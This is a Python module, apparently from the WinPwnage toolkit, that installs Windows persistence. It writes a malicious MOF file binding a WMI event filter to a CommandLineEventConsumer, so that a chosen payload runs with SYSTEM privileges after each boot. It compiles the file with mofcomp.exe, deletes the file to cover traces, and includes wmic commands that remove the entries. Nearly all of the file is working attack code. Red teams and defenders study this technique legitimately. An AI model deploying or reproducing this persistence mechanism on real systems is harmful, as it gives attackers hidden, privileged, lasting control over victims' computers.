from winpwnage.core.prints import *
from winpwnage.core.utils import *
import tempfile
import time
import os

persistMethod1_info = {
	"Description": "Persistence using mofcomp.exe (SYSTEM privileges)",
	"Method": "Malicious mof file using EventFilter EventConsumer and binding",
	"Id": "1",
	"Type": "Persistence",
	"Fixed In": "99999" if information().admin() == True else "0",
	"Works From": "7600",
	"Admin": True,
	"Function Name": "persistMethod1",
	"Function Payload": True,
}

def persistMethod1(payload, name="", add=True):
	if add:
		if payloads().exe(payload):
			mof_template = '''#PRAGMA AUTORECOVER
#PRAGMA NAMESPACE ("\\\\\\\\.\\\\root\\\\subscription")

instance of __EventFilter as $Filt
{
	Name = "''' + name + '''";
	Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 360";
	QueryLanguage = "WQL";    
	EventNamespace = "root\\\\cimv2";
};

instance of CommandLineEventConsumer as $Cons
{
	Name = "''' + name + '''";
	RunInteractively=false;
	CommandLineTemplate="''' + payloads().exe(payload)[1].replace(os.sep, os.sep*2) + '''";
};

instance of __FilterToConsumerBinding
{
	Filter = $Filt;
	Consumer = $Cons;
};'''

			if information().admin():
				try:
					mof_file = open(os.path.join(tempfile.gettempdir(), "{name}.mof".format(name=name)), "w")
					mof_file.write(mof_template)
					mof_file.close()
				except Exception:
					print_error("Cannot proceed, unable to write mof file to disk ({})".format(
						os.path.join(tempfile.gettempdir(), "{name}.mof".format(name=name))))
					return False
				else:
					print_success("Successfully wrote mof template to disk ({})".format(
						os.path.join(tempfile.gettempdir(), "{name}.mof".format(name=name))))

				time.sleep(5)

				if os.path.isfile(os.path.join(tempfile.gettempdir(), "{name}.mof".format(name=name))):
					print_info("Disabling file system redirection")
					with disable_fsr():
						print_success("Successfully disabled file system redirection")
						exit_code = process().create("mofcomp.exe", params="{}".format(os.path.join(tempfile.gettempdir(), "{name}.mof".format(name=name))), get_exit_code=True)
						print_info("Exit code: {}".format(str(exit_code)))
						if exit_code == 0:
							print_success("Successfully compiled mof file containing our payload ({})".format(payloads().exe(payload)[1]))
							print_success("Successfully installed persistence, payload will after boot")
						else:
							print_error("Unable to compile mof file containing our payload ({})".format(payloads().exe(payload)[1]))

					time.sleep(5)

					try:
						os.remove(os.path.join(tempfile.gettempdir(), "{name}.mof".format(name=name)))
					except Exception:
						print_error("Unable to cleanup")
						return False
					else:
						print_success("Successfully cleaned up, enjoy!")
				else:
					print_error("Unable to locate mof template on disk ({})".format(os.path.join(tempfile.gettempdir(), "{name}.mof".format(name=name))))
					return False
			else:
				print_error("Cannot proceed, we are not elevated")
				return False
		else:
			print_error("Cannot proceed, invalid payload")
			return False
	else:
		cmds = [
			('__EventFilter', '/namespace:"\\\\root\\subscription" PATH __EventFilter WHERE Name="{name}" DELETE'),
			('CommandLineEventConsumer', '/namespace:"\\\\root\\subscription" PATH CommandLineEventConsumer WHERE Name="{name}" DELETE'),
			('__FilterToConsumerBinding', '/namespace:"\\\\root\\subscription" PATH __FilterToConsumerBinding WHERE Filter=\'__EventFilter.Name="{name}"\' DELETE'),
		]
		for i, cmd in cmds:
			exit_code = process().create("wmic.exe", params=cmd.format(name=name, path=payloads().exe(payload)[1]), get_exit_code=True)
			if exit_code == 0:
				print_success("Successfully removed {event} (exit code: {code})".format(event=i, code=exit_code))
			else:
				print_error("Unable to removed {event} (exit code: {code})".format(event=i, code=exit_code))

			time.sleep(3)
